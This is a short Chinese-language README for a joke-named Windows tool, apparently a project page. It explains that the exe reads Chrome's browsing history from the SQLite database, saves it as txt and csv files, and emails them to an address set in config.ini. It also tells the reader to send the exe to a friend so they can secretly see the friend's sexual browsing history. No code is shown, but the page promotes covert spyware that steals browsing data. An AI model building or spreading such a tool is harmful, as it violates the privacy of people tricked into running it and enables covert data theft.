# 好友*癖查看器

点击exe自动读取chrome浏览器的浏览记录，生成txt和csv文件，再发邮件到指定邮箱

仅当chrome是默认安装路径且使用windows系统且**关闭浏览器状态**，因为不关会因为sqlite的库锁无法读取存浏览记录的数据库:pensive:

在config.ini文件里改配置，然后在两个一起发给好友，让他运行就可以~~偷窥~~到好友的色色记录了:satisfied:
